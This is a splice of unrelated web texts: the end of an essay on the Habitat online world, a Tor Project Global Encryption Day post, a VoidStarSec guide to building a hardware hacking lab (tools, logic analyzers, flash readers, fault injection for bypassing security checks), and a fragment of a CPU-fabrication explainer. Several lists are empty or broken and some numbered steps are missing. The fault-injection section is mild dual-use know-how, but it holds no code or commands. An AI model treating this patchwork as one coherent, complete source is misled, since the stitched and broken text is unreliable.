of the world itself. This requires finding ways to represent the design
and creation of regions and objects as part of the underlying fantasy.
Doing this will require changes to our conception of the world. In particular,
we don't think it will be possible to conceal all of the underpinnings
to those who work with them. However, all we really need to do is find
abstractions for those underpinnings that fit into the fantasy itself.
Though challenging, this is, in our opinion, eminently feasible. </p>

<h2>Conclusions</h2>

<p>We feel that the defining characteristic of cyberspace is the shared
virtual environment, not the display technology used to transport users
into that environment. Such a cyberspace is feasible today, if you can
live without head-mounted displays and other expensive graphics hardware.
Habitat serves as an existence proof of this contention. </p>

<p>It seems clear to us that an object-oriented world model is a key ingredient
in any cyberspace implementation. We feel we have gained some insight into
the data representation and communications needs of such a system. While
we think that it may be premature to start establishing detailed technical
standards for these things, it is time to begin the discussions that will
lead to such standards in the future. </p>

<p>Finally, we have come to believe that the most significant challenge
for cyberspace developers is to come to grips with the problems of world
creation and management. While we have only made the first inroads onto
these problems, a few things have become clear. The most important of these
is that managing a cyberspace world is not like managing the world inside
a single-user application or even a conventional online service. Instead,
it is more like governing an actual nation. Cyberspace architects will
benefit from study of the principles of sociology and economics as much
as from the principles of computer science. We advocate an agoric, evolutionary
approach to world building rather than a centralized, socialistic one.
</p>

<p>We would like to conclude with a final admonition, one that we hope
will not be seen as overly contentious: </p>

<center><p><b>Get real.</b> </p></center>

<p>In a discussion of cyberspace on Usenet, one worker in the field dismissed
Club Caribe (Habitat's current incarnation) as uninteresting, with a comment
to the effect that most of the activity consisted of inane and trivial
conversation. Indeed, the observation was largely correct. However, we
hope some of the anecdotes recounted above will give some indication that
more is going on than those inane and trivial conversations might indicate.
Further, to dismiss the system on this basis is to dismiss the users themselves.
They are paying money for this service. <i>They</i> don't view what they
do as inane and trivial, or they wouldn't do it. To insist this presumes
that one knows better than they what they should be doing. Such presumption
is another manifestation of the omniscient central planner who dictates
all that happens, a role that this entire article is trying to deflect
you from seeking. In a real system that is going to be used by real people,
it is a mistake to assume that the users will all undertake the sorts of
noble and sublime activities which you created the system to enable. Most
of them will not. Cyberspace may indeed change humanity, but only if it
begins with humanity as it really is. </p>

<div id="readability-page-1" class="page"><div><p>Today, October 21, 2023, is the third <a href="https://blog.torproject.org/global-encryption-day-2022/">Global Encryption Day</a>, organized by the <a href="https://www.globalencryption.org/">Global Encryption Coalition</a>, of which the Tor Project is a member. Global Encryption Day is an opportunity for businesses, civil society organizations, technologists, and millions of Internet users worldwide to highlight why encryption matters and to advocate for its advancement and protection.</p>
<p>Needless to say, fighting for the protection of encryption is a topic for us 365 days a year. But we want to use this day to reflect on some of the efforts we have initiated or supported in 2023 to <a href="https://blog.torproject.org/how-we-plant-and-grow-new-onions/">ensure access to encryption</a> and push back against <a href="https://www.badinternetbills.com/">government efforts that seek to undermine it</a> - from <a href="https://www.globalencryption.org/2023/06/a-call-to-the-brazilian-supreme-court-to-recognize-the-importance-of-encryption-in-safeguarding-fundamental-rights/#:~:text=By%20taking%20these%20measures%2C%20the,for%20secure%20and%20confidential%20communication.">signing letters</a> and supporting ally organizations on a number of advocacy and <a href="https://www.univision.com/local/san-francisco-kdtv/protesta-slack-cifrado-extremo-mensajes-abortos-fotos">awareness campaigns</a> to expanding our <a href="https://blog.torproject.org/empowering-human-rights-defenders/">outreach and training efforts</a> or <a href="https://blog.torproject.org/tor-tutorials/">localizing educational content</a>.</p>
<h2>Encryption's Critical Role in Safeguarding Human Rights</h2>
<p>Most recently, we co-organized and co-hosted a workshop at the Internet Governance Forum (IGF) -&nbsp;an annual meeting established by the United Nations in 2005 as a forum for multi-stakeholder dialogue concerning public policy issues relating to the internet. The panel entitled <a href="https://www.intgovforum.org/en/content/igf-2023-ws-356-encryptions-critical-role-in-safeguarding-human-rights">Encryption's Critical Role in Safeguarding Human Rights</a> brought together professionals from the technology, non-profit, policy, human rights and advocacy spaces to discuss balancing the demands of national security with the protection of individual privacy, adherence to international human rights laws and seeking a global approach.</p>
<p>The debate underscored the importance of international collaboration and respecting international standards and human rights principles to navigate the complexities of encryption and content moderation, pushing back against the weakening of encryption and the proliferation of surveillance technologies that have been used against human rights activists, journalists, and members of the civil society. The panelists called for education, including training and capacity-building of policymakers, and the normalization of encryption in creating a safer online environment for all users. Tech companies must play a role in protecting user privacy while addressing legitimate concerns related to content moderation, including the ability for safe and responsive reporting channels for users that do not compromise encryption and acknowledging the limitations of AI. By offering end-to-end encryption they can give power back to the users and simultaneously simplify their regulatory burden.</p>
<p>Two key takeaways and calls for action from our discussion have already been reflected in the first draft of IGF messaging outcomes <a href="https://intgovforum.org/en/content/kyoto-messages">"intended to provide a high-level overview for decision-makers of the most current thinking on key Internet governance and digital policy issues."</a></p>
<h3>HUMAN RIGHTS AND FREEDOMS</h3>
<ul>
<li><p>"Policymakers need to improve their understanding of Internet technologies, the infrastructure underpinning them, their modalities and business models if they are to make informed policy decisions and design appropriate regulatory frameworks. Greater transparency on the part of businesses and other stakeholders can help to achieve this."</p>
</li>
<li><p>"Technology is not confined by geographic boundaries. Laws and regulations governing the use of technology in areas such as encryption should be consistent with international standards and norms concerned with privacy, freedom of expression, due process and access to information."</p>
</li>
</ul>
<p>If you're interested to find out what other measures and recommendations to policymakers were proposed, check out the full session recording <a href="https://www.youtube.com/watch?v=M4FgMt3KXec">here</a>.</p>
<p>The Tor Project's mission is to advance Human Rights. For us that means not only by building and deploying technology, but also by advocating for the protection and unrestricted availability of privacy-preserving technologies like encryption. We are connecting with people all around the world and supporting them to use the internet safely and freely to achieve this mission.</p>

<h2 id="vss-beginners-guide-to-building-a-hardware-hacking-lab">VSS: Beginners Guide to Building a Hardware Hacking Lab</h2>

<h2 id="introduction"><a href="https://voidstarsec.com/hw-hacking-lab/intro">Introduction</a></h2>

<p>One of the most common questions that I get during a <a href="https://voidstarsec.com/training">training</a> is:</p>
<blockquote>
  <p>“What do we need to build out an initial hardware hacking lab?”</p>
</blockquote>

<p>Of course, the answer to this question can be heavily tailored based on the goals of the team and their targets, but I wanted to attempt to document what would make for a good starter lab. The following document aims to outline the basic requirements for well rounded embedded systems laboratory.</p>

<p>In this list, I will focus on devices that I and a few others regularly use for hardware pen testing and research. I will list a range of devices covering various budgets.</p>

<p>It should be noted that the following recommendations are my opinion, and <strong>none</strong> of the links below are affiliate links or anything of the sort. My goal is to help people build out their first lab, not to make money. This guide will also be maintained at the GitHub repository located <a href="https://github.com/voidstarsec/hw-hacking-lab">here</a> - please submit pull requests with your suggestions and favorite tools!</p>

<h2 id="workbench"><a href="https://voidstarsec.com/hw-hacking-lab/workbench">Workbench</a></h2>

<p>First and foremost, you will require a place to perform your work. Depending on your needs this might be a small section on your desk, or you may want an entirely separate workbench. When it comes to choosing a workbench, you’ll quickly find that you can spend a <em>lot</em> of money on a high end standing desk, especially if you’re looking for a larger one. One place you might consider looking is Home Depot / Lowes, I am a big fan of their Husky standing workbench and am currently using two of them in my office.</p>

<p>If you’re looking for something more traditional, I have also built a handful of workbench setups using IKEA tabletops and legs, this is a very popular option for workstations.</p>

<p><strong>Note:</strong> The IKEA drawer units have mounting holes on top of them for attaching to IKEA tabletops which makes assembly extremely simple, and you get the added benefit of extra storage.</p>

<h2 id="esd-protections">ESD Protections</h2>

<p>The last thing that you want to happen is for you to accidentally destroy a device with static electricity, In order to avoid this, it is always a good idea to get an ESD wrist strap or an ESD protective mat.</p>

<p><strong>Note:</strong> Not all silicone mats that you will find on Amazon are actually anti-static, please make sure that you read the description of the mat that you are going to purchase if ESD protection is a high priority for your workspace (which it should be!)</p>

<h2 id="soldering"><a href="https://voidstarsec.com/hw-hacking-lab/soldering">Soldering</a></h2>

<p>Whether you are tearing down a new router or looking for a new target to perform fault injection, you will need to solder at some point during your hardware hacking journey. Soldering is the process of joining metal surfaces with “solder”; creating a conductive connection between the two soldered points. Soldering is useful when populating unused debug pin headers or connecting wires to points on your target circuit board that you wish to interact with.</p>

<h2 id="soldering-irons">Soldering Irons</h2>

<p>When looking for a new iron, it is essential to keep your goals in mind:</p>

<ul>
  <li>Are you mainly focusing on smaller surface mount device (SMD) rework projects?</li>
  <li>Will you be working with larger/older components that may need a lot of heat to remove?</li>
</ul>

<p>Ideally, you want an iron with adjustable temperature and removable tips. These can be purchased relatively cheaply from Amazon and other online vendors. I recommend one with an emergency timeout in case you forget to turn off your iron after some late-night soldering.</p>

<h3 id="low-cost">Low Cost</h3>

<p>Below is a very solid starter kit from Amazon, which makes for a good beginner iron. Before buying a more expensive iron, use this iron to learn proper <a href="https://forum.digikey.com/t/how-to-clean-tin-and-maintain-soldering-iron-tip">care and maintenance</a>.</p>

<ul>
  <li><a href="https://www.amazon.com/KSGER-Soldering-Electronic-Controller-Equipments/dp/B0974F1VQ5">KSGER T12 Soldering Station</a></li>
</ul>

<p>Two other solid options for a beginner iron (at a slightly higher price point) are the <a href="https://www.amazon.com/Hakko-FX888D-23BY-Digital-Soldering-Station/dp/B00ANZRT4M">Hakko FX888D</a> and <a href="https://www.amazon.com/Weller-Digital-Soldering-Station-WE1010NA/dp/B077JDGY1J">Weller WE1010NA</a>. The WE1010NA is the successor to the venerable Weller WES51, which has since been discontinued.</p>

<p>For a portable option, the <a href="https://www.ifixit.com/products/ts100-soldering-iron">TS-100</a> or <a href="https://rotorriot.com/products/ts101-portable-soldering-iron-programmable-smart-iron">TS-101</a> is an excellent choice. These are great for travel, have interchangeable tips and are relatively low cost.</p>

<h3 id="high-cost">High Cost</h3>

<p>For high-end soldering or jobs that require you to solder to smaller components, such as 0402 components, a  JBC CDS station with intelligent heat management and sleep/hibernation modes can’t be beaten. This is the station that I have used for quite a while now, and it has been highly reliable and easy to maintain. With this station, you can also get tweezer tips for SMD components, making these jobs much more manageable. It also can be connected to other JBC accessories, such as a fume extractor and other JBC handles.</p>

  <li><a href="https://www.jbctools.com/c210-cartridge-range-product-18.html">Additional Tips / Cartridges</a></li>
</ul>

<p>If you have the funds to spare, the JBC DDPE 2-Tool station is great because it lets you have multiple tools active simultaneously. This station comes with micro tweezers and a T210 precision handle, which is compatible with a wide variety of cartridges.</p>

<ul>

</ul>

<h2 id="hot-air-stations--hot-plates">Hot Air Stations / Hot Plates</h2>

<p>Hot air stations and hot plates can both be used when doing SMD rework. Hot plates work as you might expect, they require surface to surface contact in order to heat the target device, allowing for either solder paste or a traditional iron to be used to bond the solder to the contact pads. These of course have some disadvantages, if you are working with a system that has plastic connectors, housings or is a two sided PCB with components on each side you will not be able to effectively use a hotplate without risking damaging the target. Hot plates can be used in conjunction with a hot air gun in order to “preheat” your target, making component removal easier.</p>

<h3 id="low-cost-1">Low Cost</h3>

<p>Introductory hot plates are relatively low cost, the <a href="https://www.amazon.com/Soiiw-Microcomputer-Soldering-Preheating-200X200mm/dp/B082H12PPT">Soiiw Microcomputer Soldering Preheating station</a> is a great place to start as it has built-in temperature control and display (helpful for letting others in the lab know that the plate is on!).</p>

<p>If you are going for a lower-cost hot air rework station, there are plenty on Amazon. I have used the YIHUA 959D and have had no issues with it. Others have recommended the <a href="https://www.amazon.com/Quick-957DW-Hot-Station-Watt/dp/B074SBH4G5">QUICK 957D Rework Station</a>, which also has excellent reviews!</p>

<h3 id="high-cost-1">High Cost</h3>

<p>You will need a hot air station for BGA rework or other package removal. Like a standard soldering station, these can vary in price/quality. A higher-end hot air rework station will allow for precise temperature and airflow control; they will also have a wider variety of hose attachments, allowing for the removal/replacement of smaller components. When working with standard embedded systems, the JBC TESE is an excellent rework station that has multiple suction tips and hose sizes included:</p>

<ul>
  <li><a href="https://www.jbctools.com/tese-precision-hot-air-station-product-1255.html">JBC TESE</a></li>
</ul>

<p>Of course, if you are looking to do a <em>lot</em> of SMD rework and reflow on PCBs, you may want to consider the <a href="https://www.jbctools.com/srs-smd-rework-system-product-1454.html">SRS System SMD Rework</a> station.</p>

<p>This kit includes an arm, allowing for hands-free operation, as well as a preheater. A preheater is a device used to (as you might have guessed) pre-heat the PCB from below, allowing things to be soldered more easily.</p>

<p>The full table of all of the recommended kits can be seen below:</p>

<h2 id="multimeters"><a href="https://voidstarsec.com/hw-hacking-lab/multimeter">Multimeters</a></h2>

<p>Regardless of the types of components and targets that you’re working on, you will need a multimeter. This is what you will use for your initial survey of your device for things such as measuring voltage, resistance, current and checking for continuity. When choosing a multimeter, make sure that you review the available voltage and current ranges and that they match the ranges of your expected targets. Some multimeters will also have an “auto-range” feature, which will attempt to automatically select the appropriate range for measuring voltage/current/resistance, etc. This feature can be helpful when measuring unknown voltages; it will save you a few button presses when measuring points on a target. The two multimeters listed below are the ones that I keep in my toolbox. I have also included different probes sets, allowing smaller pads/pins to be measured.</p>

<h2 id="microscopesmagnification"><a href="https://voidstarsec.com/hw-hacking-lab/microscopes-magnification">Microscopes/Magnification</a></h2>

<p>When tearing down a target for the first time, you first want to locate and document all of the part numbers. Part numbers and PCB markings can sometimes be challenging to see with the naked eye, so having a cheap benchtop microscope or hand held loupe is never a bad idea. These will also come in handy when removing or modifying small components. Hand held loupes are great for quick identification of components.</p>

<h2 id="oscilloscopes"><a href="https://voidstarsec.com/hw-hacking-lab/oscilloscope">Oscilloscopes</a></h2>

<p>While multimeters help us measure various signals on our target device, an oscilloscope can help us capture and visualize these measurements. When selecting a scope, you need to consider what the use case will be. Will you be doing differential power analysis or power trace captures? Or are you more interested in capturing other types of analog waveforms over a longer period? The main variables to look at when selecting an oscilloscope are:</p>

<ul>
  <li><strong>Channel Count</strong> - How many channels can you capture on</li>
  <li><strong>Memory Depth</strong> - This is how long you can capture for</li>
  <li><strong>Sample Rate</strong> - How fast the analog signal is sampled</li>
  <li><strong>Bandwidth</strong> -Maximum frequency of an input signal that can be passed through the analog front end (probe)</li>
</ul>

<p>Without enough bandwidth, you will capture what appears to be a distorted signal, and with too slow of a sample rate, you risk data loss.</p>

<p><strong>Remember</strong>: According to the <a href="https://www.sciencedirect.com/topics/engineering/nyquist-theorem#:~:text=Nyquist's%20theorem%20states%20that%20a,oscilloscope%20bandwidth%20would%20be%20typical.">Nyquist sampling theorem</a> sampling rate should be at least 2x the frequency of your target signal <strong>at a minimum</strong>!</p>

<p>An excellent introductory scope can be purchased for ~$500; all big manufacturers offer something in this range. For example, the SIGLENT SDS1104 is an excellent starting scope with a bandwidth of 100MHz and a sample rate of 1GSa/s. I’ve listed a few options below, ranging in price from lowest to highest, and included a few tables from some of the manufacturer’s websites as well:</p>

<p><strong>Note:</strong> Many modern oscilloscopes can be upgraded via software. For example, many will have built-in logic analyzers and signal decoders. These will come at an extra cost; decoders are typically $100-$400, depending on the protocol, and other software upgrades can be purchased to unlock things like faster sample rates and increased bandwidth, etc. It’s easy for a 2k-4k oscilloscope purchase to turn into a 10k purchase once all the upgrades and add-ons have been included.</p>

<p>Below are some specifications from the RIGOL MSO5000 line:</p>

<p><img src="https://voidstarsec.com/hw-hacking-lab/assets/images/rigol.png" alt="Image"></p>

<p>The MSO5354 is an excellent deal for this line, especially considering the 350MHz bandwidth and the 8GSa/s sampling rate. I have this in my lab and use it regularly.</p>

<p>Here is a similar specification table from the SIGLENT SDS2000 line:</p>

<p><img src="https://voidstarsec.com/hw-hacking-lab/assets/images/siglent.png" alt="Image"></p>

<p>The Siglent and the Rigol have great options for the prices listed above. Make sure that you pick an appropriate scope per the types of targets you anticipate analyzing.</p>

<h2 id="logic-analyzers"><a href="https://voidstarsec.com/hw-hacking-lab/logic-analyzer">Logic Analyzers</a></h2>

<p>Let’s say you identified a fluctuating voltage sequence with your multimeter and decided to look at the signal with your oscilloscope. After viewing the signal with the oscilloscope, you saw sequences of high and low pulses that look something like this:</p>

<p><img src="https://i.stack.imgur.com/Jpcg1.jpg" alt="Image"></p>

<p>We will need a Logic Analyzer to make more sense of this signal capture. Logic analyzers are used when analyzing digital signals; they can take sequences of high and low voltages and translate them into a stream of logical 1s and 0s. This stream of 1s and 0s can then be analyzed and decoded via software to display packet structures and more user-friendly data to the user. When choosing a logic analyzer, we need to consider the following:</p>

<ul>
  <li>Channel Count - How many channels can be analyzed at once?</li>
  <li>Sampling Rate - How quickly can we sample data?</li>
  <li>Hardware Sampling Depth / Memory Depth - How long can we sample?</li>
  <li>Threshold Voltages - What voltage ranges are compatible with this device?</li>
</ul>

<p>When analyzing standard COTS devices that utilize SPI, eMMC, etc., the Kingst and DSLogic series logic analyzers will work 90% of the time. The Saleae has a well-polished software interface, including APIs for writing decoders <em>and</em> instrumenting captures. The analog capture features of the Saleae are also beneficial when debugging lower-level issues. Despite being the most expensive analyzers listed here, they are worth purchasing if your budget allows it.</p>

<h2 id="oscilloscope-vs-logic-analyzers-"><a href="https://voidstarsec.com/hw-hacking-lab/oscope-vs-logic-analyzer">Oscilloscope Vs. Logic Analyzers </a></h2>

<p>Another common question that often comes up as we review the tools in class is</p>

<blockquote>
  <p>What is an oscilloscope used for, and what is a logic analyzer used for? Don’t they both measure signals?</p>
</blockquote>

<p>While the short answer is yes, they both measure electronic signals and visualize them for human consumption; there are a few key differences.</p>

<ol>
  <li>
    <p>Oscilloscopes are useful for analyzing <strong>analog waveforms</strong>, that is, data that is steadily changing over time</p>
  </li>
  <li>
    <p>Logic analyzers are used to analyze <strong>digital signals</strong> and convert high/low voltage pulses into a sequence of 0s and 1s that we can attempt to interpret.</p>
  </li>
</ol>

<p>So, how do we choose what tool to use? For example, let’s say we are measuring a voltage source on a particular target we are trying to <a href="https://voidstarsec.com/blog/replicant-part-1">glitch</a>. If we want to monitor the fluctuations of the voltage line, we should use an oscilloscope. The oscilloscope will let us observe the <strong>voltage over time</strong>, allowing us to see the small period where the voltage drops to a low value and then returns to normal. See the image below, where the purple line represents the voltage line being glitched:</p>

<p><img src="https://voidstarsec.com/blog/assets/images/glitch/scope/SDS00001.png" alt="Glitch!"></p>

<p>We can also use oscilloscopes to characterize and capture power traces. For example, see the following power trace that was captured from the Trezor (purple line):</p>

<p><img src="https://voidstarsec.com/blog/assets/images/glitch/scope/power_trace.png" alt="Power Trace"></p>

<p>In the previous two examples, we measured a signal oscillating between a range of values and not just <strong>HIGH</strong> or <strong>LOW</strong>. There are fluctuations, rising and falling sequences, and other interesting patterns that we could not catch with our logic analyzer as the logic analyzer looks for either a high or low voltage and reports the results back to the user as a digital signal.</p>

<p>For an example of when we might use a logic analyzer, let’s revisit the oscilloscope capture from before:</p>

<p><img src="https://i.stack.imgur.com/Jpcg1.jpg" alt="Image"></p>

<p>Notice that there are not nearly as many strange shapes or fluctuations in this signal; the line either appears at a high or low voltage at any given time. While some oscilloscopes can decode digital signals like this, they often are limited by how much memory they can use for a capture. So that means that if you’re trying to capture UART traffic on a Linux system that takes 60 seconds to boot, you would need a large amount of memory / a costly scope. Also, if you wanted to extract the data from the stream or try to decode it using custom plugins, getting access to the digital signal is a headache (<strong>Note</strong> It is possible, but logic analyzers greatly simplify this process for us). This is a perfect use case for our logic analyzer if we want to extract the <strong>data</strong> being encoded in this <strong>digital signal</strong>.</p>

<p>The Logic analyzer can sample for much longer because it samples a signal, reports whether the sample is high or low, and does not report back the exact values in between. Note that what defines high or low can often be configured within your logic analyzer software, but the analyzer will still report back either a 0 or 1. Because the logic analyzer is not concerned with all the values in between, it requires significantly less memory to capture over long periods.</p>

<p>To illustrate this, let’s revisit the <a href="https://voidstarsec.com/blog/uart-uboot-and-usb">older blog post we published last year</a>. The following video shows that the voltage levels fluctuate around 3.3V and eventually return to idle at 3.3V.</p>

<p><img src="https://voidstarsec.com/blog/assets/images/serial.gif" alt="Gif"></p>

<p>If we were to capture this signal with an oscilloscope, it would look very similar to the screenshot we referenced earlier. However, there is one problem - this system takes about <strong>90 seconds</strong> to boot, and ideally, we want to capture all of the traffic in a way that allows us to analyze it. This is where our logic analyzer will come in handy.</p>

<p>After connecting our logic analyzer to the signals referenced in the blog post, our logic analyzer software (Pulseview) captures the following:</p>

<p><img src="https://voidstarsec.com/blog/assets/images/pulseview-uart.png" alt="UART"></p>

<p>With this traffic captured, we can set up a decoder to get human-readable values out of this signal, as shown below:</p>

<p><img src="https://voidstarsec.com/blog/assets/images/decoded2.png" alt="Image"></p>

<p>Now, we can export this data to a text or binary file for further analysis.</p>

<p>So, in summary - when we want to capture digital signal traffic such as SPI, UART, I2C, JTAG, etc, we use a logic analyzer. If we want to analyze the <strong>shape</strong> of the waveform or we are investigating an analog signal such as a power source or audio signal, we use an oscilloscope.</p>

<h2 id="clips--jumpers--probes"><a href="https://voidstarsec.com/hw-hacking-lab/clips-and-probes">Clips / Jumpers / Probes</a></h2>

<p>Sometimes, we have to connect to specific pads or pins to analyze the signal on our target device, but that does not always require soldering and removing components. Probing test pads and reading flash chips in-circuit can significantly reduce the debugging/analysis time when performing firmware patches or testing PoCs. Below are some helpful items that I use when soldering/connecting to new targets. The PCBite kit is handy as the fine-tip probes will often save you from needing to solder to test pads when performing initial analysis.</p>

<h2 id="power-supplies"><a href="https://voidstarsec.com/hw-hacking-lab/power-supplies">Power Supplies</a></h2>

<p>When picking a power supply, you need to consider the power requirements of your targets. Be sure to review the voltage and current limitations and choose an appropriate supply based on the targets you will analyze. Some power supplies have options like Over-Current Protection (OCP), which is a feature that prevents a power supply from providing more current than it can handle. Some power supplies will also include a <a href="https://www.ti.com/lit/an/slyt467/slyt467.pdf?ts=1696813801504&amp;ref_url=https%253A%252F%252Fwww.google.com%252F">Remote Sense</a> feature that is used to regulate the output voltage at the target load. This compensates for the voltage drop across the cables connecting the power supply to the target load.</p>

<p>When attempting to utilize a hardware debug mechanism (especially from a black box perspective), there is no “one size fits all” tool. Whether you are accessing a <a href="https://wrongbaud.github.io/posts/jtag-hdd/">JTAG</a> tap or an <a href="https://wrongbaud.github.io/posts/stm-xbox-jtag/">SWD</a> peripheral, there are two hurdles that you need to overcome:</p>

<ol>
  <li>Can your hardware communicate with the TAP/DAP?
    <ol>
      <li>Logic Levels, appropriate speeds, timings, etc</li>
    </ol>
  </li>
  <li>Can your software properly enumerate and interact with the TAP/DAP?
    <ol>
      <li>OpenOCD, UrJTAG, OEM Tools, etc</li>
    </ol>
  </li>
</ol>

<p>The right tools for the job is critical when looking at a new hardware-level debug peripheral. Make sure that you search for OEM software/hardware and always check the latest OpenOCD commits for similar targets.</p>

<h2 id="flash-readers"><a href="https://voidstarsec.com/hw-hacking-lab/flash-extraction">Flash Readers</a></h2>

<p>So, you have done your initial teardown and identified a non-volatile storage device from which you want to extract some data. Perhaps there is a <a href="https://wrongbaud.github.io/posts/router-teardown/">SPI flash</a> chip or a <a href="https://wrongbaud.github.io/posts/Holiday-Teardown/">TSOP 48 parallel</a> flash that you want to extract data from. Many flash readers are available; below is a list of what I have in my lab. The Xeltek is somewhat expensive (it is currently on sale for $995.00), and the individual sockets for different chip packages range from $400-$700, so the cost adds up quickly. However, with that cost comes support from Xeltek and fairly reliable tooling, assuming you are comfortable with BGA rework and re-balling ICs, this may be the right choice for you and your team.</p>

<p>In my experience, no flash readout tool works on <strong>everything</strong>. Some tools are better at certain flash types than others. Having a few options in your hardware hacking toolbox is always a good idea if your preferred tool does not support your target device. If I had to pick two devices from the list above, I would choose the FlashCAT and the XGecu T56; you will have a wide range of target chip coverage between those two.</p>



<p>Having a few generic embedded interface tools in your toolkit is always a good idea. I am a big fan of using embedded Linux SBCs due to their flexibility and the fact that you have an entire OS at your disposal, which can open up opportunities to use your favorite programming language to interact with the standard peripherals. One of the most common Linux-based SBCs, the Raspberry Pi, has been difficult to acquire over the last few years. Luckily, the Armbian project supports other boards, such as the Orange Pi Zero 2 and the Orange Pi 4 LTS. You may not always require a fully featured OS, and you just need a tool that can talk to peripherals. In this case, having FT2232H-based boards, such as the generic breakouts and things like the Tigard, will also come in handy. While the FT2232H is a well known, classic interface IC, the RP2040 is quickly gaining popularity due to its ease of use and availability. The Buspirate, a classic embedded Swiss army knife, recently released a new version that the RP2040 powers (Note that the Link below is for just the PCB and not for the entire product)</p>

<h2 id="fault-injection"><a href="https://voidstarsec.com/hw-hacking-lab/fault-injection">Fault Injection</a></h2>

<p>Fault injection (FI) involves introducing an error/modification minor enough to cause undefined behavior on a target but not enough to stop the target from operating entirely. This typically involves injecting a high-voltage pulse or temporarily draining the voltage from a targeted power source or “rail” on the target system.</p>

<p>By causing momentary voltage modulations (either above or below the expected voltage), we can force our target system to enter a realm of undefined behavior. An adequately targeted fault can bypass various security checks or other features that may impede an attacker or reverse engineer.</p>

<p>When it comes to FI, I think that <a href="https://twitter.com/furrtek">Furrtek</a> explained it best here:</p>

<p><img src="https://voidstarsec.com/hw-hacking-lab/images/glitch.gif" alt="Image"></p>

<p>Regarding FI, anything capable of pulling a voltage line low or injecting a clock pulse <strong>can</strong> work. However, depending on your target and attack, you might need advanced timing or protocol triggering, where tools such as the ChipWhisperer become very handy. When learning the fundamentals of fault injection, you cannot go wrong with an introductory ChipWhisperer kit. Their materials and example targets explain the principles behind fault injection and provide a tested, repeatable learning environment. I can’t recommend their materials highly enough. If the ChipWhisperer tools are too expensive for your budget, however, there are other tools that folks have used in the past. I have included the tools in the table below and provided some example blog posts that utilize them to help get you started. We have also published a blog post <a href="https://voidstarsec.com/blog/replicant-part-1">here</a> as an introduction to FI.</p>

<p>In the realm of security testing, these tools play a crucial role in assessing and safeguarding the integrity of wireless communication systems and devices. High-cost options provide powerful capabilities for in-depth analysis of various RF signals, allowing security professionals to identify vulnerabilities, intercept and decode wireless transmissions, and assess the robustness of communication protocols. These tools are often employed in academic and research settings for advanced RF security research. On the other hand, low-cost options are accessible solutions that aid in testing and securing more common wireless technologies, including RFID, Bluetooth, Wi-Fi, and various ISM band devices.</p>

<h2 id="conclusion"><a href="https://voidstarsec.com/hw-hacking-lab/conclusion">Conclusion</a></h2>

<p>This write-up covered some of the tools required to build your first hardware hacking toolkit. This by no means is an exhaustive list, and I’m sure there are plenty of alternatives to the devices I’ve listed here.Also, it should be noted that you don’t need <strong>all</strong> of these tools to start hacking on hardware. Sometimes it makes more sense to buy what you need for a given project and save money for nicer equipment later on. I hope this guide was helpful; I plan to revisit this writeup regularly to update it with new tools. If you think a tool should be added to this guide, feel free to email at contact@voidstarsec.com or on <a href="https://twitter.com/wrongbaud">Twitter</a>. A list of just the components discussed here can be found on this <a href="https://github.com/voidstarsec/hw-hacking-lab">github repository</a>, and all pull requests are welcome!</p>

<h5>2021-11-09 - By Robert Elder</h5>



<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The purpose of this article is to explain how to make a CPU out of rocks and sand as fast as possible without using too many words. &nbsp;As the world of proprietary hardware and software crushes in around us, we risk losing the ability to make things for ourselves as individuals. &nbsp;It is for this reason that I felt compelled to learn how one could hypothetically make their own integrated circuits by themself. &nbsp;Skip to the end of this article for a few more words on this subject and a disclaimer.</p>

<h2>10) Now, you've got pristine freshly-cut silicon wafers.  Optionally, dope them with Boron, Phosphorus or another dopant.</h2>

<p><a href="https://blog.robertelder.org/how-to-make-a-cpu/10-freshly-cut-wafers_3840x2160_q92.jpeg"><img src="https://blog.robertelder.org/how-to-make-a-cpu/10-freshly-cut-wafers_600x338_q70.jpeg" alt="Freshly Cut Wafer" width="600" height="338"></a></p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;I was not brave enough to buy elemental phosphorus, so you'll have to use your imagination with the matches.</p>

<h2>11) Put photoresist on the wafer.</h2>

<p><a href="https://blog.robertelder.org/how-to-make-a-cpu/11-photoresist_2022x1212_q92.jpeg"><img src="https://blog.robertelder.org/how-to-make-a-cpu/11-photoresist_600x360_q70.jpeg" alt="Photoresist" width="600" height="360"></a></p>

<h2>12) Take a chromium-etched photo-lithographic quartz mask with your desired circuit pattern and shine a laser beam through it to project the circuit pattern onto the wafer.</h2>

<p><a href="https://blog.robertelder.org/how-to-make-a-cpu/12-overhead-photomask_3840x2160_q92.jpeg"><img src="https://blog.robertelder.org/how-to-make-a-cpu/12-overhead-photomask_600x338_q70.jpeg" alt="Shine Light Photomask" width="600" height="338"></a></p>

<h2>13) The locations of the shadows produced by the photo-mask will control where the photo-resist is chemically changed on the surface of the silicon wafer (depending on whether you used positive or negative photoresist). </h2>

<h2>15) Acid etch the exposed parts of the wafer.</h2>

<p><a href="https://blog.robertelder.org/how-to-make-a-cpu/15-acid-etch_3840x2160_q92.jpeg"><img src="https://blog.robertelder.org/how-to-make-a-cpu/15-acid-etch_600x338_q70.jpeg" alt="Acid Etch Wafer" width="600" height="338"></a></p>

<h2>16) Perform countless iterations and repetitions of homo-epitaxy, hetero-epitaxy, pseudo-epitaxy, diffusion doping, copper interconnect layers, chemical mechanical polishing, photoresist applications, acid etching, and photomask exposing to build up the desired features on the wafer.</h2>

<h2>18) Now you've got un-packaged silicon dies.  Locate the pads on the silicon chip, and attach bond wires, or use the flip-chip method as is done now for most modern processors.</h2>

<p><a href="https://blog.robertelder.org/how-to-make-a-cpu/18-unpackaged-silicon-dies_3840x2160_q92.jpeg"><img src="https://blog.robertelder.org/how-to-make-a-cpu/18-unpackaged-silicon-dies_600x338_q70.jpeg" alt="Unpackaged Silicon Dies" width="600" height="338"></a></p>

<h2>19) Use the bond wires or solder balls to provide an electrical connection between the pins on the chip package, and the pads on the silicon die.</h2>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;And that's how you make a CPU. &nbsp;Also, see <a href="https://blog.robertelder.org/how-small-is-a-cpu/">CPUs Are Smaller Than You Think</a> for a look inside a real Intel CPU.</p>

<h2>A Few More Words</h2>

